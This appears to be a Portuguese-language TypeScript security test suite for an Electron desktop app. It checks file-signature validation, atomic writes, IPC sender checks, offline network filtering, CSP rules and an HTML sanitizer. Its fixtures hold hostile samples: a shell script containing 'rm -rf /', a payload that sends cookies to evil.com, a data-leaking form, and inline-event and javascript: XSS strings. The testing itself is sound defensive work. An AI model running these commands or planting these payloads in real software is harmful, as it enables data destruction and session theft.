/**
 * Bateria de Testes Automatizados de Hardening e Segurança do Electron (Electron Security Checklist)
 *
 * Valida:
 * 1. Validação em Memória do Buffer, Tamanho e Assinatura Mágica ANTES da Escrita em Disco (file:saveExportedFile)
 * 2. Bloqueio Incondicional de Binários Executáveis (Windows PE/MZ, Linux ELF, Mach-O, Shebang #!)
 * 3. Gravação Atômica com Arquivo Temporário Restrito (mode 0o600) e Autorização de Sessão
 * 4. Validação do Processo Remetente IPC (validateIpcSender - senderFrame, webContents, URLs autorizadas)
 * 5. Controle de Conexões de Rede (100% Offline - bloqueio de domínios externos, Google Fonts, telemetria)
 * 6. Política de Segurança de Conteúdo (CSP) no index.html e headers de produção (sem unsafe-eval, restrições estritas)
 * 7. Empacotamento 100% Local de Tipografia (Inter e Outfit) sem requisições externas
 * 8. Sanitização Rigorosa de HTML Importado contra Ataques XSS e Injeções Maliciosas (HtmlSanitizer)
 */

import fs from 'fs';
import path from 'path';
import os from 'os';
import { fileURLToPath } from 'url';
import {
  validateBufferContentMatchesType,
  validateFileContentMatchesType,
  validateSafeFilePath,
  authorizeSessionPath,
  DANGEROUS_EXTENSIONS,
  ALLOWED_EXTENSIONS
} from '../electron/pathSecurity.ts';
import { HtmlSanitizer } from '../src/services/htmlSanitizer.ts';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const projectRoot = path.resolve(__dirname, '..');

async function runElectronSecurityTestSuite() {
  console.log('='.repeat(80));
  console.log('  BATALHÃO DE TESTES DE HARDENING E SEGURANÇA DO ELECTRON (KOVAX FILES)');
  console.log('='.repeat(80));

  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'kovax-electron-sec-'));
  let testsPassed = 0;
  let testsFailed = 0;

  function assert(condition: boolean, testName: string, detail?: string) {
    if (condition) {
      console.log(`  [PASS] ${testName}`);
      testsPassed++;
    } else {
      console.error(`  [FAIL] ${testName} ${detail ? `-> Detalhes: ${detail}` : ''}`);
      testsFailed++;
    }
  }

  try {
    // =========================================================================
    // 1. VALIDAÇÃO DE BUFFER EM MEMÓRIA E TAMANHO MÁXIMO (file:saveExportedFile)
    // =========================================================================
    console.log('\n[1/7] Testando Validação em Memória de Buffer e Limites de Tamanho...');

    // 1.1 Buffer vazio (0 bytes)
    const emptyBuf = Buffer.alloc(0);
    const emptyCheck = validateBufferContentMatchesType(emptyBuf, '.pdf');
    assert(
      !emptyCheck.valid && !!emptyCheck.error?.includes('vazio'),
      'Buffer vazio (0 bytes) deve ser rejeitado em memória',
      emptyCheck.error
    );

    // 1.2 Simulação de buffer excedendo 500 MB
    const MAX_EXPORT_BUFFER_BYTES = 500 * 1024 * 1024;
    const oversizedLength = MAX_EXPORT_BUFFER_BYTES + 1024;
    const isOversized = oversizedLength > MAX_EXPORT_BUFFER_BYTES;
    assert(
      isOversized,
      'Buffers acima de 500 MB devem ser rejeitados antes de alocação/escrita em disco'
    );

    // 1.3 Bloqueio de executável Windows PE (MZ) disfarçado de .pdf
    const fakePdfMz = Buffer.from([0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]);
    const mzCheck = validateBufferContentMatchesType(fakePdfMz, '.pdf');
    assert(
      !mzCheck.valid && !!mzCheck.error?.includes('Windows PE (MZ)'),
      'Buffer com assinatura PE (MZ) disfarçado de PDF deve ser sumariamente bloqueado',
      mzCheck.error
    );

    // 1.4 Bloqueio de binário executável Linux ELF disfarçado de .pdf
    const fakePdfElf = Buffer.from([0x7F, 0x45, 0x4C, 0x46, 0x02, 0x01, 0x01, 0x00]);
    const elfCheck = validateBufferContentMatchesType(fakePdfElf, '.pdf');
    assert(
      !elfCheck.valid && !!elfCheck.error?.includes('ELF'),
      'Buffer com assinatura Linux ELF disfarçado de PDF deve ser sumariamente bloqueado',
      elfCheck.error
    );

    // 1.5 Bloqueio de binário Mach-O disfarçado de .docx
    const fakeDocxMacho = Buffer.from([0xFE, 0xED, 0xFA, 0xCE, 0x00, 0x00, 0x00, 0x00]);
    const machoCheck = validateBufferContentMatchesType(fakeDocxMacho, '.docx');
    assert(
      !machoCheck.valid && !!machoCheck.error?.includes('Mach-O'),
      'Buffer com assinatura Mach-O disfarçado de DOCX deve ser sumariamente bloqueado',
      machoCheck.error
    );

    // 1.6 Bloqueio de Script com Shebang disfarçado de .pdf
    const fakePdfShebang = Buffer.from('#!/bin/bash\nrm -rf /\n');
    const shebangCheck = validateBufferContentMatchesType(fakePdfShebang, '.pdf');
    assert(
      !shebangCheck.valid && !!shebangCheck.error?.includes('Shebang'),
      'Buffer iniciado com Shebang (#!) disfarçado de PDF deve ser sumariamente bloqueado',
      shebangCheck.error
    );

    // 1.7 Validação de tipos legítimos vs extensão divergente
    const realPdfBuf = Buffer.from('%PDF-1.7\n1 0 obj\n<< /Type /Catalog >>\nendobj\ntrailer\n<<>>\n%%EOF');
    const realPdfCheck = validateBufferContentMatchesType(realPdfBuf, '.pdf');
    assert(realPdfCheck.valid, 'Buffer contendo cabeçalho %PDF- válido deve ser aceito para .pdf');

    const mismatchCheck = validateBufferContentMatchesType(realPdfBuf, '.docx');
    assert(
      !mismatchCheck.valid && !!mismatchCheck.error?.includes('PK'),
      'Buffer PDF fornecido com extensão .docx deve ser rejeitado por divergência de assinatura',
      mismatchCheck.error
    );

    // =========================================================================
    // 2. GRAVAÇÃO ATÔMICA COM ARQUIVO TEMPORÁRIO (file:saveExportedFile)
    // =========================================================================
    console.log('\n[2/7] Testando Pipeline de Gravação Atômica e Proteção do Destino...');

    const finalTargetPath = path.join(tmpDir, 'documento_final_seguro.pdf');
    const targetDir = path.dirname(finalTargetPath);
    const tempFileName = `.${path.basename(finalTargetPath)}.tmp.${Date.now()}.${Math.random().toString(36).substring(2, 8)}`;
    const tempFilePath = path.join(targetDir, tempFileName);

    // Simula a escrita atômica do handler IPC
    // 1. Validação em memória prévia
    const preCheck = validateBufferContentMatchesType(realPdfBuf, '.pdf');
    assert(preCheck.valid, 'Validação prévia em memória deve autorizar escrita');

    // 2. Escrita no arquivo temporário com permissões restritas (0o600)
    fs.writeFileSync(tempFilePath, realPdfBuf, { mode: 0o600 });
    assert(fs.existsSync(tempFilePath), 'Arquivo temporário restrito foi gerado');

    // 3. Validação física no disco antes de mover
    const diskCheck = validateFileContentMatchesType(tempFilePath, '.pdf');
    assert(diskCheck.valid, 'Arquivo temporário no disco foi validado com sucesso');

    // 4. Renomeação atômica
    fs.renameSync(tempFilePath, finalTargetPath);
    assert(fs.existsSync(finalTargetPath), 'Arquivo definitivo foi criado após renomeação atômica');
    assert(!fs.existsSync(tempFilePath), 'Arquivo temporário não deve mais existir após o rename');

    // 5. Autorização de sessão
    authorizeSessionPath(finalTargetPath);
    const sessionAuth = validateSafeFilePath(finalTargetPath);
    assert(sessionAuth.valid, 'Arquivo final recém-gravado deve ser autorizado na sessão');

    // 6. Teste de não-contaminação do disco se validação falhar ANTES da escrita
    const maliciousDestPath = path.join(tmpDir, 'tentativa_maliciosa.pdf');
    const malCheck = validateBufferContentMatchesType(fakePdfMz, '.pdf');
    if (!malCheck.valid) {
      // Como a validação em memória falha, o código do electron/main.ts retorna antes de tocar no disco!
    }
    assert(
      !fs.existsSync(maliciousDestPath),
      'Nenhum arquivo ou arquivo temporário deve ser gravado se a validação do buffer falhar em memória'
    );

    // =========================================================================
    // 3. BLOQUEIO DE EXTENSÕES PERIGOSAS E EXTENSÕES NÃO AUTORIZADAS
    // =========================================================================
    console.log('\n[3/7] Testando Lista Negra e Branca de Extensões...');

    const dangerousTests = ['.exe', '.bat', '.cmd', '.sh', '.vbs', '.ps1', '.js', '.msi', '.pif', '.scr'];
    for (const ext of dangerousTests) {
      assert(
        DANGEROUS_EXTENSIONS.has(ext),
        `Extensão altamente perigosa ${ext} deve estar na lista DANGEROUS_EXTENSIONS`
      );
      assert(
        !ALLOWED_EXTENSIONS.has(ext),
        `Extensão perigosa ${ext} NUNCA deve constar em ALLOWED_EXTENSIONS`
      );
    }

    // =========================================================================
    // 4. VALIDAÇÃO DO PROCESSO REMETENTE IPC (validateIpcSender)
    // =========================================================================
    console.log('\n[4/7] Testando Lógica de Validação de Remetente IPC (validateIpcSender)...');

    // Implementação direta do validador para testes unitários
    function testValidateIpcSender(
      senderFrame: { url: string } | null | undefined,
      isMainWindowSender: boolean,
      isDev: boolean,
      devServerUrl?: string
    ): { allowed: boolean; error?: string } {
      if (!senderFrame) {
        return { allowed: false, error: 'senderFrame ausente' };
      }
      if (!isMainWindowSender) {
        return { allowed: false, error: 'sender não coincide com a janela principal' };
      }
      const frameUrl = senderFrame.url;
      if (isDev && devServerUrl && frameUrl.startsWith(devServerUrl)) {
        return { allowed: true };
      }
      if (frameUrl.startsWith('file://')) {
        return { allowed: true };
      }
      return { allowed: false, error: `URL de origem não autorizada (${frameUrl})` };
    }

    // 4.1 Frame nulo / ausente
    const noFrameResult = testValidateIpcSender(null, true, false);
    assert(!noFrameResult.allowed, 'Chamada IPC sem senderFrame deve ser rejeitada');

    // 4.2 Sender não coincide com webContents da janela principal
    const wrongSenderResult = testValidateIpcSender({ url: 'file:///app/index.html' }, false, false);
    assert(!wrongSenderResult.allowed, 'Chamada IPC de webContents diferente da janela principal deve ser rejeitada');

    // 4.3 URL de origem maliciosa externa
    const evilOriginResult = testValidateIpcSender({ url: 'https://malicious-site.com/exploit.html' }, true, false);
    assert(
      !evilOriginResult.allowed && !!evilOriginResult.error?.includes('não autorizada'),
      'Chamada IPC originada de site externo/remoto deve ser bloqueada'
    );

    // 4.4 URL legítima de produção (file://)
    const validProdResult = testValidateIpcSender({ url: 'file:///d:/KovaxFilesApp/dist/index.html' }, true, false);
    assert(validProdResult.allowed, 'Chamada IPC originada de file:// local em produção deve ser autorizada');

    // 4.5 URL legítima de desenvolvimento (Vite dev server)
    const validDevResult = testValidateIpcSender(
      { url: 'http://localhost:5173/' },
      true,
      true,
      'http://localhost:5173'
    );
    assert(validDevResult.allowed, 'Chamada IPC originada do Vite Dev Server local em modo dev deve ser autorizada');

    // =========================================================================
    // 5. CONTROLE DE CONEXÕES DE REDE (100% OFFLINE)
    // =========================================================================
    console.log('\n[5/7] Testando Filtro de Conexões de Rede (Modo 100% Offline)...');

    function testNetworkFilter(url: string, isDev: boolean): boolean {
      if (
        url.startsWith('file:') ||
        url.startsWith('data:') ||
        url.startsWith('blob:') ||
        url.startsWith('devtools:')
      ) {
        return true; // Permitido
      }
      if (
        isDev &&
        (url.startsWith('http://localhost:') ||
          url.startsWith('http://127.0.0.1:') ||
          url.startsWith('ws://localhost:') ||
          url.startsWith('ws://127.0.0.1:'))
      ) {
        return true; // Permitido apenas em desenvolvimento
      }
      return false; // Bloqueado
    }

    // 5.1 Bloqueio de Google Fonts e CDNs externas
    assert(!testNetworkFilter('https://fonts.googleapis.com/css2?family=Inter', false), 'Conexão para fonts.googleapis.com deve ser bloqueada');
    assert(!testNetworkFilter('https://fonts.gstatic.com/s/inter/v13/xyz.woff2', false), 'Conexão para fonts.gstatic.com deve ser bloqueada');
    assert(!testNetworkFilter('https://analytics.google.com/collect', false), 'Conexão de telemetria externa deve ser bloqueada');
    assert(!testNetworkFilter('https://cdn.jsdelivr.net/npm/bootstrap.css', false), 'Conexão para CDN pública externa deve ser bloqueada');

    // 5.2 Permissão de protocolos locais essenciais
    assert(testNetworkFilter('file:///app/dist/index.html', false), 'Protocolo file: deve ser permitido');
    assert(testNetworkFilter('data:image/png;base64,iVBORw0KGgo...', false), 'Protocolo data: deve ser permitido');
    assert(testNetworkFilter('blob:http://localhost:5173/uuid-1234', false), 'Protocolo blob: deve ser permitido');
    assert(testNetworkFilter('devtools://devtools/bundled/inspector.html', false), 'Protocolo devtools: deve ser permitido');

    // =========================================================================
    // 6. VERIFICAÇÃO ESTÁTICA DE CSP E EMPACOTAMENTO DE FONTES LOCAIS
    // =========================================================================
    console.log('\n[6/7] Verificando Conformidade de CSP e Empacotamento de Fontes em index.html...');

    const indexHtmlPath = path.join(projectRoot, 'index.html');
    const indexHtmlContent = fs.readFileSync(indexHtmlPath, 'utf-8');

    // 6.1 Verificar remoção de unsafe-eval
    assert(
      !indexHtmlContent.includes("'unsafe-eval'"),
      "index.html NÃO deve conter 'unsafe-eval' na CSP"
    );

    // 6.2 Verificar ausência de links externos para Google Fonts
    assert(
      !indexHtmlContent.includes('fonts.googleapis.com') && !indexHtmlContent.includes('fonts.gstatic.com'),
      'index.html NÃO deve possuir links para fonts.googleapis.com ou fonts.gstatic.com'
    );

    // 6.3 Verificar inclusão das fontes empacotadas locais
    assert(
      indexHtmlContent.includes('/fonts/fonts.css'),
      'index.html deve referenciar a folha de estilos local /fonts/fonts.css'
    );

    // 6.4 Verificar diretivas essenciais de segurança
    assert(
      indexHtmlContent.includes("object-src 'none'"),
      "CSP em index.html deve conter object-src 'none'"
    );
    assert(
      indexHtmlContent.includes("base-uri 'none'"),
      "CSP em index.html deve conter base-uri 'none'"
    );

    // 6.5 Verificar arquivos físicos de fontes empacotadas em public/fonts/
    const fontsDir = path.join(projectRoot, 'public', 'fonts');
    const fontsCssPath = path.join(fontsDir, 'fonts.css');
    assert(fs.existsSync(fontsCssPath), 'Arquivo public/fonts/fonts.css deve existir');

    const fontFiles = fs.readdirSync(fontsDir);
    const fontBinaryFiles = fontFiles.filter(f => f.endsWith('.woff2') || f.endsWith('.ttf'));
    assert(
      fontBinaryFiles.length >= 9,
      `Fontes locais empacotadas devem conter todas as variantes requeridas de Inter e Outfit (encontradas: ${fontBinaryFiles.length})`
    );

    // =========================================================================
    // 7. SANITIZAÇÃO RIGOROSA DE HTML IMPORTADO CONTRA XSS (HtmlSanitizer)
    // =========================================================================
    console.log('\n[7/7] Testando Sanitização Rigorosa de HTML Importado (HtmlSanitizer)...');

    // 7.1 Remoção de tag script maliciosa
    const xssScript = '<div>Peticao Inicial</div><script>window.location="http://evil.com?c="+document.cookie</script>';
    const sanitizedScript = HtmlSanitizer.sanitize(xssScript);
    assert(
      !sanitizedScript.toLowerCase().includes('<script') && !sanitizedScript.includes('evil.com'),
      'Tag <script> maliciosa deve ser completamente removida'
    );

    // 7.2 Remoção de handler de evento inline onerror
    const xssImg = '<p>Parágrafo 1</p><img src="invalido.jpg" onerror="alert(\'Ataque XSS Executado!\')" />';
    const sanitizedImg = HtmlSanitizer.sanitize(xssImg);
    assert(
      !sanitizedImg.toLowerCase().includes('onerror'),
      'Atributo de evento inline onerror deve ser totalmente removido'
    );

    // 7.3 Bloqueio de pseudo-protocolo javascript: em links
    const xssLink = '<a href="javascript:alert(document.domain)">Clique aqui para ver a prova</a>';
    const sanitizedLink = HtmlSanitizer.sanitize(xssLink);
    assert(
      !sanitizedLink.toLowerCase().includes('javascript:'),
      'Pseudo-protocolo javascript: em links deve ser eliminado'
    );

    // 7.4 Remoção de tag iframe maliciosa
    const xssIframe = '<h3>Relatório</h3><iframe src="http://site-invasor.com/iframe-phishing"></iframe>';
    const sanitizedIframe = HtmlSanitizer.sanitize(xssIframe);
    assert(
      !sanitizedIframe.toLowerCase().includes('<iframe') && !sanitizedIframe.includes('site-invasor'),
      'Tag <iframe> maliciosa deve ser removida'
    );

    // 7.5 Remoção de tags object e embed
    const xssObjectEmbed = '<object data="malware.swf"></object><embed src="malware.pdf">';
    const sanitizedObj = HtmlSanitizer.sanitize(xssObjectEmbed);
    assert(
      !sanitizedObj.toLowerCase().includes('<object') && !sanitizedObj.toLowerCase().includes('<embed'),
      'Tags <object> e <embed> devem ser removidas'
    );

    // 7.6 Remoção de tags svg e forms maliciosos
    const xssSvgForm = '<svg onload="alert(1)"><circle r="10"/></svg><form action="http://evil.com/leak"><input name="csrf"/></form>';
    const sanitizedSvgForm = HtmlSanitizer.sanitize(xssSvgForm);
    assert(
      !sanitizedSvgForm.toLowerCase().includes('<svg') &&
      !sanitizedSvgForm.toLowerCase().includes('onload') &&
      !sanitizedSvgForm.toLowerCase().includes('<form'),
      'Tags <svg> com onload e <form> de vazamento de dados devem ser eliminadas'
    );

    // 7.7 Bloqueio de script em CSS inline (expression e javascript:)
    const xssCss = '<div style="color: red; expression(alert(1)); background: url(javascript:alert(2)); font-size: 14pt;">Texto Seguro</div>';
    const sanitizedCss = HtmlSanitizer.sanitize(xssCss);
    assert(
      !sanitizedCss.toLowerCase().includes('expression') &&
      !sanitizedCss.toLowerCase().includes('javascript:') &&
      sanitizedCss.includes('color: red') &&
      sanitizedCss.includes('font-size: 14pt'),
      'Injeções de scripts em atributos style devem ser neutralizadas mantendo estilos legítimos'
    );

    // 7.8 Preservação intacta de formatações legítimas de documentos jurídicos
    const legalDocHtml = `
      <h1 style="text-align: center; color: #1e3a8a;">EXCELENTÍSSIMO SENHOR DOUTOR JUIZ DE DIREITO</h1>
      <p style="text-align: justify; line-height: 1.5; font-size: 12pt;">
        <b>AUTOR</b>, devidamente qualificado nos autos do processo em epígrafe, vem respeitosamente à presença de Vossa Excelência requerer:
      </p>
      <table style="width: 100%; border: 1px solid #ccc;">
        <thead>
          <tr><th>Item</th><th>Descrição</th><th>Valor (R$)</th></tr>
        </thead>
        <tbody>
          <tr><td>1</td><td>Dano Material</td><td>10.000,00</td></tr>
        </tbody>
      </table>
    `.trim();
    const sanitizedLegal = HtmlSanitizer.sanitize(legalDocHtml);
    assert(
      sanitizedLegal.includes('EXCELENTÍSSIMO') &&
      sanitizedLegal.includes('AUTOR') &&
      sanitizedLegal.includes('Dano Material') &&
      sanitizedLegal.includes('<table') &&
      sanitizedLegal.includes('text-align: justify'),
      'Formatação documental legítima (tabelas, negrito, alinhamentos) deve ser integralmente preservada'
    );

  } finally {
    // Limpeza de diretório temporário de testes
    try {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    } catch {
      // Ignora erro de limpeza temporária
    }
  }

  console.log('\n' + '='.repeat(80));
  console.log(`RESULTADO DA BATERIA DE SEGURANÇA ELECTRON:`);
  console.log(`  Testes Passados: ${testsPassed}`);
  console.log(`  Testes Falhados: ${testsFailed}`);
  console.log('='.repeat(80));

  if (testsFailed > 0) {
    throw new Error(`Bateria de segurança falhou com ${testsFailed} erro(s).`);
  }
}

runElectronSecurityTestSuite().catch(err => {
  console.error('\nErro fatal durante execução da bateria de segurança:', err);
  process.exit(1);
});
